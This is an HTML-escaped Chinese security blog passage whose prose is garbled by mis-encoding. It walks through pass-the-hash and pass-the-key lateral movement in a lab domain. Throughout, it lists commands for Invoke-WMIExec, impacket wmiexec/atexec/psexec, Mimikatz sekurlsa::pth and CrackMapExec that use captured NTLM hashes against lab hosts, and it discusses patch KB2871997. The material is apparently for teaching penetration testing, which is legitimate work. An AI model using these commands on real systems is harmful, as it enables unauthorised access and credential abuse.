&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;invoke-wmiexec&#34;&gt;Invoke-WMIExec&lt;/h3&gt;
&lt;p&gt;åŒæ ·æ˜¯åœ¨åœ¨&lt;a href=&#34;https://github.com/Kevin-Robertson/Invoke-TheHash&#34;&gt;Invoke-TheHash&lt;/a&gt;é¡¹ç›®çš„ä¸€ä¸ªè„šæœ¬ï¼Œå«åš&lt;code&gt;Invoke-WMIExec.ps1&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ç”¨æ³•è·Ÿä¸Šé¢æ˜¯ä¸€è‡´çš„ï¼Œåªæ˜¯åˆ©ç”¨çš„æ–¹å¼ä¸ç›¸åŒè€Œå·²ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Import-Modle&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-WMIExec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-WMIExec&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Target&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;106&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Domain&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;lab&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Username&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;testuser&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Hash&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;de26cce0356891a4a020e7c4957afc72&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;calc.exe&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-verbose&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;wmiexec&#34;&gt;wmiexec&lt;/h3&gt;
&lt;p&gt;å½“ç„¶è¿˜æœ‰å®ƒçš„pythonç‰ˆæœ¬ï¼Œä¹Ÿæ˜¯åœ¨æ˜¯&lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;impacket&lt;/a&gt;é‡Œé¢çš„ä¸€ä¸ªå·¥å…·ï¼Œåœ¨kaliæ˜¯å·²ç»é¢„è£…å¥½çš„ï¼Œç”¨æ³•è·Ÿsmbexec.pyæ˜¯ä¸€è‡´çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;wmiexec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lab&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testuser&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;@172&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;106&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-hashes&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;atexec&#34;&gt;Atexec&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªå°±æ˜¯è‡ªåŠ¨åŒ–å®ç°è®¡åˆ’ä»»åŠ¡çš„æ–¹å¼ï¼Œä¹Ÿæ˜¯åœ¨æ˜¯&lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;impacket&lt;/a&gt;é‡Œé¢çš„ä¸€ä¸ªå·¥å…·ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72 hack.lab/testuser@172.16.0.106 whoami
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/18.png&#34; alt=&#34;18&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;mimikatz-1&#34;&gt;Mimikatz&lt;/h3&gt;
&lt;p&gt;åˆæ˜¯è€³ç†Ÿèƒ½è¯¦çš„&lt;strong&gt;Mimikatz&lt;/strong&gt;å¤§æ€å™¨äº†ï¼Œmimikatzçš„pthåŠŸèƒ½éœ€è¦æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼Œè¿™æ˜¯ç”±å®ƒçš„å®ç°æœºåˆ¶å†³å®šçš„ï¼Œéœ€è¦å…ˆè·å¾—é«˜æƒé™è¿›ç¨‹lsass.exeçš„ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;p&gt;å¯ä»¥åˆ°GitHubä¸‹è½½æ–°ç‰ˆçš„ï¼šhttps://github.com/gentilkiwi/mimikatz&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¸€å¼€å§‹æ— æ³•è¿æ¥åˆ°dcæœåŠ¡å™¨æŸ¥çœ‹cç›˜ä¸‹çš„æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/12.png&#34; alt=&#34;12&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬åœ¨ä¸»æœºä¸Šå¯åŠ¨æˆ‘ä»¬çš„mimikatzå·¥å…·ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;privilege&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;debug&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;sekurlsa&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pth&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;testuser&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;domain&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;lab&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ntlm&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;de26cce0356891a4a020e7c4957afc72&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/15.png&#34; alt=&#34;15&#34;&gt;&lt;/p&gt;
&lt;p&gt;å°±ä¼šå¼¹å‡ºä¸€ä¸ªcmdå‘½ä»¤çª—å£ï¼Œè¿™æ¬¡æˆ‘ä»¬å†æ¬¡è¾“å…¥å°±èƒ½é‡æ–°åˆ—å‡ºdcä¸Šcç›˜çš„æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/16.png&#34; alt=&#34;16&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;psexec&#34;&gt;psexec&lt;/h3&gt;
&lt;p&gt;å½“ç„¶ä¹Ÿå°‘ä¸äº†æˆ‘ä»¬çš„&lt;strong&gt;psexec&lt;/strong&gt;å¤§æ€å™¨ï¼Œè¿™æ˜¯åœ¨å¾®è½¯å®˜æ–¹æä¾›çš„ä¸€ä¸ª PsTools å·¥å…·åŒ…é‡Œé¢ï¼Œè™½ç„¶ä¸ç”¨åšå…æ€ï¼Œä½†æ˜¯ä¼šåœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ç•™ä¸‹è®°å½•ã€‚&lt;/p&gt;
&lt;p&gt;å®˜æ–¹çš„ä¸‹è½½åœ°å€ï¼š&lt;a href=&#34;https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec&#34;&gt;PsExec - Windows Sysinternals&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;PsExec çš„åŸºæœ¬åŸç†æ˜¯ï¼šé€šè¿‡ç®¡é“åœ¨è¿œç¨‹ç›®æ ‡ä¸»æœºä¸Šåˆ›å»ºä¸€ä¸ª psexec æœåŠ¡ï¼Œå¹¶åœ¨æœ¬åœ°ç£ç›˜ä¸­ç”Ÿæˆä¸€ä¸ªåä¸ºâ€PSEXESVCâ€œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ psexec æœåŠ¡è¿è¡Œå‘½ä»¤ï¼Œè¿è¡Œç»“æŸååˆ é™¤æœåŠ¡ã€‚ç”±äºåˆ›å»ºæˆ–åˆ é™¤æœåŠ¡æ—¶ä¼šäº§ç”Ÿå¤§é‡çš„æ—¥å¿—ï¼Œå¯ä»¥åœ¨æ”»å‡»æº¯æºæ—¶é€šè¿‡æ—¥å¿—åæ¨æ”»å‡»æµç¨‹ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;éœ€è¦è¿œç¨‹ç³»ç»Ÿå¼€å¯adminå…±äº«ï¼ˆé»˜è®¤æ˜¯å¼€å¯çš„ï¼‰ï¼ŒåŸç†æ˜¯åŸºäºIPCå…±äº«ï¼Œç›®æ ‡éœ€è¦å¼€æ”¾445ç«¯å£å’Œadminåœ¨ä½¿ç”¨IPCè¿æ¥ç›®æ ‡ç³»ç»Ÿåï¼Œä¸éœ€è¦è¾“å…¥è´¦æˆ·å’Œå¯†ç ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä½¿ç”¨æ–¹æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PsExec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;105&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lab&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lucky&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;@ssw0rd&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ipconfig&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å› ä¸ºå®˜æ–¹çš„å·¥å…·åªæ”¯æŒæ˜æ–‡å»ºç«‹é“¾æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨pythonç‰ˆæœ¬çš„ï¼Œä¹Ÿæ˜¯åœ¨Impacketå·¥å…·åŒ…ä¸­çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;psexec.py hack.lab/lucky@172.16.0.105 -hashes &lt;span class=&#34;s1&#34;&gt;&amp;#39;aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/14.png&#34; alt=&#34;14&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;crackmapexec-1&#34;&gt;CrackMapExec&lt;/h3&gt;
&lt;p&gt;ä¸Šé¢åœ¨è·å–hashçš„æ—¶å€™ä¹Ÿæœ‰ä»‹ç»ä¸€ç‚¹ï¼Œç°åœ¨pthä¹Ÿå¯ä»¥åˆ©ç”¨åˆ°è¿™æ¬¾å·¥å…·ã€‚æœ¬èŠ‚å®‰è£…åœ¨kalié€‰çš„æ˜¯Linuxï¼Œå…¶ä»–ç‰ˆæœ¬å¯ä»¥åˆ°GitHubä¸Šä¸‹è½½&lt;a href=&#34;https://github.com/byt3bl33d3r/CrackMapExec&#34;&gt;CrackMapExec&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å®‰è£…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install crackmapexec
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½¿ç”¨æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;crackmapexec smb 172.16.0.106 -u testuser -H de26cce0356891a4a020e7c4957afc72 -x whoami -d hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-the-key&#34;&gt;Pass The Key&lt;/h2&gt;
&lt;p&gt;åœ¨2014å¹´å¾®è½¯ç»ˆäºå‘å¸ƒäº†æ›´æ–°è¡¥ä¸kb2871997ï¼Œç¦æ­¢æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·ç”¨äºè¿œç¨‹è¿æ¥ï¼Œè¿™æ ·å°±æ— æ³•ä»¥æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·çš„æƒé™æ‰§è¡Œwmiã€PSEXECã€schtasksã€atå’Œè®¿é—®æ–‡ä»¶å…±äº«ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯ä¸Šé¢çš„æè¿°ä¸æ˜¯å¾ˆæ­£ç¡®çš„ï¼Œä¹‹å‰ä¹Ÿæœ‰å‘æ–‡è¯´è¿™ä¸ªè¡¥ä¸é˜»æ­¢äº†pth,ä¸‰å¹´åè¿˜å‘äº†ä¸€ç¯‡æ¾„æ¸…æ–‡ç« ï¼š&lt;a href=&#34;https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167&#34;&gt;Pass-the-Hash Is Dead&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å…³äºè¿™ä¸ªè¡¥ä¸çš„è¯¦ç»†åˆ†æå¯ä»¥å‚è€ƒé—®&lt;a href=&#34;https://www.freebuf.com/articles/system/220473.html&#34;&gt;KB22871997æ˜¯å¦çœŸçš„èƒ½é˜²å¾¡PTHæ”»å‡»ï¼Ÿ&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;é‚£ä¹ˆä»€ä¹ˆæ‰å«åšpass-the-keyå‘¢&#34;&gt;é‚£ä¹ˆä»€ä¹ˆæ‰å«åšpass the keyå‘¢ï¼Ÿ&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;ä½†æ˜¯åœ¨&lt;a href=&#34;https://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash&#34;&gt;Overpass-the-hash&lt;/a&gt;å’Œä¸‰å¥½å­¦ç”Ÿä¸­&lt;a href=&#34;https://www.vuln.cn/6813&#34;&gt;pass the hash&lt;/a&gt;çš„æ–‡ç« ä¸­è§£é‡Šçš„æ˜¯ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ç¦ç”¨NTLMä½¿å¾—psexecæ— æ³•åˆ©ç”¨è·å¾—çš„ntlm hashè¿›è¡Œè¿œç¨‹è¿æ¥ï¼Œè™½ç„¶â€sekurlsa::pthâ€åœ¨mimikatzä¸­è¢«ç§°ä¹‹ä¸ºâ€Pass The Hashâ€,ä½†æ˜¯å…¶å·²ç»è¶…è¶Šäº†ä»¥å‰çš„â€Pass The Hashâ€ï¼Œéƒ¨åˆ†äººå°†å…¶å‘½åä¸ºâ€Overpass-the-hashâ€ï¼Œä¹Ÿå°±æ˜¯â€Pass-the-keyâ€&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å°†å“ˆå¸Œæ³¨å…¥åˆ° msv1_0&lt;strong&gt;å’Œ&lt;/strong&gt;kerberos æä¾›ç¨‹åºä¸­ï¼Œä»è€Œå¯ä»¥å“åº” NTLM æŒ‘æˆ˜å¹¶è·å¾— Kerberos TGTã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;åœ¨&lt;a href=&#34;https://daiker.gitbook.io/windows-protocol/kerberos/1#1.-pass-the-hash-he-pass-the-key&#34;&gt;windows-protocol&lt;/a&gt;å’Œã€Šå†…ç½‘å®‰å…¨æ¸—é€ã€‹ä¸€ä¹¦ä¸­æåˆ°çš„æ˜¯ï¼š&lt;/p&gt;
&lt;p&gt;ç”¨ntlmä¼ é€’é‚£å°±æ˜¯pass the hashï¼Œç”¨mimikatzçš„&lt;code&gt;sekurlsa::ekeys&lt;/code&gt;é‚£å°±ç§°ä¸ºpass the keyã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;æˆ‘çš„ç†è§£å°±æ˜¯pass the keyæ˜¯ç”¨kerberosæ–¹å¼è¿›è¡Œä¼ é€’ï¼Œpass the hashæ˜¯ç”¨NTLMçš„æ–¹å¼è¿›è¡Œä¼ é€’ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä¹Ÿåœ¨æœ¬åœ°æµ‹è¯•è¿‡ï¼Œè·Ÿ&lt;a href=&#34;https://www.freebuf.com/articles/system/220473.html&#34;&gt;KB22871997æ˜¯å¦çœŸçš„èƒ½é˜²å¾¡PTHæ”»å‡»ï¼Ÿ&lt;/a&gt;æ–‡ç« çš„ç»“æœæ˜¯ä¸€æ ·çš„ï¼Œæœ‰æ²¡æœ‰å®‰è£…kb2871997è¡¥ä¸éƒ½æ˜¯æ²¡åŠæ³•ä½¿ç”¨åŠ å…¥ç®¡ç†å‘˜ç»„çš„ç”¨æˆ·è¿›è¡Œpthã€‚&lt;/p&gt;
&lt;p&gt;åœ¨æ–‡ç« &lt;a href=&#34;https://www.freebuf.com/articles/web/271048.html&#34;&gt;å†…ç½‘æ¸—é€æ‹¿ä¸åˆ°å¯†ç æ€ä¹ˆåŠï¼Ÿè¯•è¯•Pass-The-Hash&lt;/a&gt;å½“ä¸­æœ‰ä¸ªä¸€å¥æè¿°è¿™ä¸ªé—®é¢˜ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å·¥ä½œç»„ç¯å¢ƒä¸‹:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Windows Vistaä¹‹å‰çš„æœºå™¨ï¼Œå¯ä»¥ä½¿ç”¨æœ¬åœ°ç®¡ç†å‘˜ç»„å†…ç”¨æˆ·è¿›è¡Œæ”»å‡» windows Vistaä¹‹åçš„æœºå™¨ï¼Œåªèƒ½æ˜¯administratorç”¨æˆ·æ‰èƒ½è¿›è¡Œæ”»å‡»ï¼Œå…¶ä»–ç”¨æˆ·ä¼šæç¤ºæ‹’ç»è®¿é—®
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;åŸŸç¯å¢ƒä¸‹:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;åŸŸå†…ä»»æ„ä¸€å°ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜æƒé™å’ŒåŸŸç®¡ç†å‘˜å¯†ç çš„NTLM hashå€¼ï¼Œå¯è¿›è¡Œpthæ”»å‡»
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ç”±äºPass-The-Hashåœ¨win7çš„å·¥ä½œç»„ç¯å¢ƒä¸‹åªæ”¯æŒåœ¨administratorç”¨æˆ·çš„æƒ…å†µä¸‹æ‰èƒ½åˆ©ç”¨ï¼Œè€Œwindowsé»˜è®¤æ˜¯å…³é—­è¿™ä¸ªç”¨æˆ·çš„
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;æ‰€ä»¥ä¸æ˜¯å› ä¸ºè¿™ä¸ªè¡¥ä¸è€Œå¯¼è‡´æˆ‘ä»¬ç”¨æˆ·ä¸€èˆ¬æƒ…å†µä¸‹ä¸èƒ½ä½¿ç”¨pthçš„ï¼Œä½¿ç”¨sidä¸º500çš„adminisitratorç¡®å®æ˜¯å¯ä»¥ä½¿ç”¨pthã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;ä½¿ç”¨aes-keyçš„æ–¹å¼è¿›è¡Œptkæ˜¯å¦è¦å®‰è£…è¡¥ä¸å‘¢&#34;&gt;ä½¿ç”¨aes keyçš„æ–¹å¼è¿›è¡Œptkæ˜¯å¦è¦å®‰è£…è¡¥ä¸å‘¢ï¼Ÿ&lt;/h3&gt;
&lt;p&gt;åœ¨ç½‘ä¸Šçš„æ–‡ç« ä¸­å’Œã€Šå†…ç½‘å®‰å…¨æ¸—é€ã€‹ä¸€ä¹¦éƒ½æœ‰ä¸€ä¸ªæè¿°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable) ; AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å°±æ˜¯è¯´å¦‚æœä¸å®‰è£…è¿™ä¸ªè¡¥ä¸å°±ä¸èƒ½ä½¿ç”¨aes keyçš„æ–¹å¼è¿›è¡Œptkï¼Œä½†æ˜¯æˆ‘åœ¨æµ‹è¯•äº†æ— æ•°æ¬¡ï¼Œåœ¨æ²¡æœ‰è¡¥ä¸çš„æƒ…å†µï¼Œè¿˜æ˜¯å¯ä»¥ä½¿ç”¨ptkçš„æ–¹å¼è¿›è¡Œä¼ é€’çš„ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä½¿ç”¨ç³»ç»Ÿå‘½ä»¤æŸ¥çœ‹æ˜¯å¦å®‰è£…äº†è¯¥è¡¥ä¸ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;systeminfo&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;findstr&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;kb2871997&amp;#34;&lt;/span&gt;
